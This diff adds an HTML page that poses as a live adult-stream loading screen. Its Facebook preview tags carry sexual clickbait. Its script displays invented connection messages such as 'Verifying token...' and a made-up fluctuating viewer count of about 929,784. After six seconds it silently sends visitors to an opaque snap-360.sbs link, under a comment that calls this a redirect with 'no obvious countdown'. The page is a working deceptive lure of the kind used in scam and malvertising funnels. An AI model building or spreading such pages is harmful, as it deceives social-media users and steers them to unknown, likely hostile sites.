@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- OPEN GRAPH (FB PREVIEW) -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="💋 LIVE ON A PRIVATE SITE 🔥 FREE AND FUN 👀 JOIN NOW">
+<meta property="og:description" content="929.784 Online Members">
+<meta property="og:image" content="https://res.cloudinary.com/dl4ijdbe/image/upload/v1784533409/jljxemnpxdepewhv1cfw.jpg">
+<meta property="og:image:width" content="1080">
+<meta property="og:image:height" content="1080">
+<meta name="robots" content="index, follow">
+
+<!-- STYLE ANIMASI -->
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html, body {
+  height: 100%;
+  color: #fff;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  overflow: hidden;
+  background: #0f0f0f;
+}
+
+.wrap {
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  position: relative;
+}
+
+/* Video Background */
+.video-bg {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.video-bg video {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  min-width: 100%;
+  min-height: 100%;
+  width: auto;
+  height: auto;
+  transform: translate(-50%, -50%);
+  object-fit: cover;
+  filter: blur(8px) brightness(0.4);
+}
+
+.video-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: radial-gradient(circle at center, rgba(20,20,20,0.6) 0%, rgba(0,0,0,0.9) 100%);
+  z-index: 1;
+}
+
+/* Background animated particles */
+.particles {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  z-index: 1;
+  pointer-events: none;
+}
+
+.particle {
+  position: absolute;
+  width: 3px;
+  height: 3px;
+  background: rgba(255, 255, 255, 0.15);
+  border-radius: 50%;
+  animation: float 20s infinite;
+}
+
+@keyframes float {
+  0%, 100% {
+    transform: translateY(100vh) rotate(0deg);
+    opacity: 0;
+  }
+  10% { opacity: 0.5; }
+  90% { opacity: 0.5; }
+  100% {
+    transform: translateY(-100vh) rotate(720deg);
+    opacity: 0;
+  }
+}
+
+/* Main content */
+.content {
+  z-index: 2;
+  text-align: center;
+  padding: 20px;
+  width: 100%;
+  max-width: 420px;
+}
+
+/* Live Badge */
+.live-badge-container {
+  margin-bottom: 20px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.2s;
+}
+
+.live-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 20px;
+  background: rgba(255, 0, 0, 0.15);
+  border: 1px solid rgba(255, 0, 0, 0.3);
+  border-radius: 50px;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  color: #ff4444;
+  text-transform: uppercase;
+}
+
+.live-dot {
+  width: 8px;
+  height: 8px;
+  background: #ff4444;
+  border-radius: 50%;
+  animation: blink 1.5s infinite;
+  box-shadow: 0 0 10px #ff4444;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+
+/* Modern spinner */
+.loader-container {
+  position: relative;
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 25px auto;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.4s;
+}
+
+.loader {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border: 3px solid transparent;
+  border-top-color: rgba(255, 255, 255, 0.3);
+  border-right-color: rgba(255, 255, 255, 0.1);
+  border-radius: 50%;
+  animation: spin 1.2s linear infinite;
+}
+
+.loader-inner {
+  position: absolute;
+  top: 12px;
+  left: 12px;
+  right: 12px;
+  bottom: 12px;
+  border: 3px solid transparent;
+  border-top-color: rgba(255, 255, 255, 0.6);
+  border-left-color: rgba(255, 255, 255, 0.2);
+  border-radius: 50%;
+  animation: spin-reverse 1.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+@keyframes spin-reverse {
+  to { transform: rotate(-360deg); }
+}
+
+/* Loading text */
+.text {
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 8px;
+  color: rgba(255, 255, 255, 0.9);
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.6s;
+}
+
+.subtext {
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.4);
+  margin-bottom: 30px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.8s;
+}
+
+/* Progress bar */
+.progress-container {
+  width: 200px;
+  height: 3px;
+  background: rgba(255, 255, 255, 0.08);
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 0 auto 20px auto;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 1s;
+}
+
+.progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, #ff4444, #ff6b6b);
+  border-radius: 10px;
+  width: 0%;
+  animation: loading 4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+  box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
+}
+
+@keyframes loading {
+  0% { width: 0%; }
+  50% { width: 70%; }
+  80% { width: 90%; }
+  100% { width: 100%; }
+}
+
+/* Status text */
+.status-text {
+  font-size: 12px;
+  color: rgba(255, 255, 255, 0.35);
+  font-variant-numeric: tabular-nums;
+  letter-spacing: 0.5px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 1.2s;
+  min-height: 18px;
+}
+
+/* Video preview card - STREAM STYLE */
+.video-preview {
+  margin-top: 25px;
+  width: 100%;
+  border-radius: 12px;
+  overflow: hidden;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  background: rgba(0, 0, 0, 0.5);
+  position: relative;
+  opacity: 0;
+  transform: translateY(10px);
+  animation: preview-in 0.6s ease forwards 0.5s;
+}
+
+.video-preview video {
+  width: 100%;
+  height: 200px;
+  object-fit: cover;
+  display: block;
+  opacity: 0.7;
+}
+
+/* Stream overlay on video */
+.stream-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  padding: 12px;
+  background: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, transparent 30%, transparent 60%, rgba(0,0,0,0.6) 100%);
+  pointer-events: none;
+}
+
+.stream-top-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.stream-viewers {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #fff;
+  background: rgba(0,0,0,0.5);
+  padding: 4px 10px;
+  border-radius: 20px;
+  backdrop-filter: blur(4px);
+}
+
+.viewer-dot {
+  width: 6px;
+  height: 6px;
+  background: #4ade80;
+  border-radius: 50%;
+  animation: pulse-dot 2s infinite;
+}
+
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.6; transform: scale(0.8); }
+}
+
+.stream-quality {
+  font-size: 10px;
+  font-weight: 700;
+  color: #fff;
+  background: rgba(255, 0, 0, 0.8);
+  padding: 3px 8px;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+}
+
+.stream-bottom-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.stream-avatar {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  border: 2px solid rgba(255,255,255,0.2);
+}
+
+.stream-info {
+  text-align: left;
+}
+
+.stream-username {
+  font-size: 13px;
+  font-weight: 600;
+  color: #fff;
+}
+
+.stream-title {
+  font-size: 11px;
+  color: rgba(255,255,255,0.6);
+}
+
+/* Connecting toast */
+.connecting-toast {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%) translateY(20px);
+  background: rgba(20, 20, 20, 0.95);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  padding: 12px 24px;
+  border-radius: 50px;
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.7);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  opacity: 0;
+  animation: toast-in 0.5s ease forwards 2s;
+  z-index: 10;
+  backdrop-filter: blur(10px);
+}
+
+.toast-spinner {
+  width: 14px;
+  height: 14px;
+  border: 2px solid rgba(255,255,255,0.1);
+  border-top-color: #4ade80;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes toast-in {
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+@keyframes fade-in {
+  to { opacity: 1; }
+}
+
+@keyframes preview-in {
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .content {
+    padding: 16px;
+  }
+  
+  .loader-container {
+    width: 70px;
+    height: 70px;
+  }
+
+  .text {
+    font-size: 20px;
+  }
+
+  .video-preview video {
+    height: 170px;
+  }
+  
+  .connecting-toast {
+    font-size: 12px;
+    padding: 10px 18px;
+  }
+}
+</style>
+
+<base target="_blank">
+</head>
+<body>
+  <div class="wrap">
+    <!-- Video Background -->
+    <div class="video-bg">
+      <video autoplay muted loop playsinline poster="https://res.cloudinary.com/daxme62nv/video/upload/v1781997496/Visit_onlyshare.io_for_MORE_12408_online-video-cutter.com_cez235.mp4">
+        <source src="https://res.cloudinary.com/daxme62nv/video/upload/v1781997496/Visit_onlyshare.io_for_MORE_12408_online-video-cutter.com_cez235.mp4" type="video/mp4">
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+
+    <!-- Background particles -->
+    <div class="particles" id="particles"></div>
+
+    <div class="content">
+      <!-- Live Badge -->
+      <div class="live-badge-container">
+        <div class="live-badge">
+          <span class="live-dot"></span>
+          LIVE
+        </div>
+      </div>
+
+      <div class="loader-container">
+        <div class="loader"></div>
+        <div class="loader-inner"></div>
+      </div>
+
+      <div class="text" id="statusTitle">Connecting to stream...</div>
+      <div class="subtext">Establishing secure connection</div>
+
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+
+      <div class="status-text" id="statusText">Initializing...</div>
+
+      <!-- Video Preview Card - Real Stream Look -->
+      <div class="video-preview">
+        <video autoplay muted loop playsinline poster="https://res.cloudinary.com/daxme62nv/video/upload/v1781996596/Visit_onlyshare.io_for_MORE_12481_online-video-cutter.com_q8yfnt.mp4">
+          <source src="https://res.cloudinary.com/daxme62nv/video/upload/v1781996596/Visit_onlyshare.io_for_MORE_12481_online-video-cutter.com_q8yfnt.mp4" type="video/mp4">
+        </video>
+        
+        <div class="stream-overlay">
+          <div class="stream-top-bar">
+            <div class="stream-viewers">
+              <span class="viewer-dot"></span>
+              <span id="viewerCount">929,784</span>
+            </div>
+            <div class="stream-quality">HD</div>
+          </div>
+          
+          <div class="stream-bottom-bar">
+            <div class="stream-avatar">👤</div>
+            <div class="stream-info">
+              <div class="stream-username">Private Room 🔒</div>
+              <div class="stream-title">Exclusive Content</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Subtle connecting toast -->
+    <div class="connecting-toast" id="connectToast">
+      <div class="toast-spinner"></div>
+      <span>Joining broadcast...</span>
+    </div>
+  </div>
+
+<script>
+// Create floating particles
+const particlesContainer = document.getElementById('particles');
+for (let i = 0; i < 30; i++) {
+  const particle = document.createElement('div');
+  particle.className = 'particle';
+  particle.style.left = Math.random() * 100 + '%';
+  particle.style.animationDelay = Math.random() * 20 + 's';
+  particle.style.animationDuration = (Math.random() * 15 + 15) + 's';
+  particlesContainer.appendChild(particle);
+}
+
+// Dynamic status text simulation
+const statusTexts = [
+  "Initializing...",
+  "Resolving host...",
+  "Handshaking...",
+  "Verifying token...",
+  "Buffering stream...",
+  "Optimizing quality...",
+  "Almost ready..."
+];
+let statusIndex = 0;
+const statusEl = document.getElementById('statusText');
+const statusTitle = document.getElementById('statusTitle');
+
+const statusInterval = setInterval(() => {
+  statusIndex++;
+  if (statusIndex < statusTexts.length) {
+    statusEl.textContent = statusTexts[statusIndex];
+  }
+  if (statusIndex === 3) {
+    statusTitle.textContent = "Securing connection...";
+  }
+  if (statusIndex === 5) {
+    statusTitle.textContent = "Preparing broadcast...";
+  }
+}, 600);
+
+// Simulate fluctuating viewer count
+const viewerEl = document.getElementById('viewerCount');
+let baseViewers = 929784;
+setInterval(() => {
+  const change = Math.floor(Math.random() * 50) - 25;
+  baseViewers += change;
+  viewerEl.textContent = baseViewers.toLocaleString();
+}, 2000);
+
+// Smooth redirect (no obvious countdown)
+setTimeout(function () {
+  window.location.replace("https://snap-360.sbs/D7ES6aGbJPuwUTXZhIRJsexnShVRoKrv");
+}, 6000);
+</script>
+
+    <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5009121,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5009121&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+</body>
+</html>
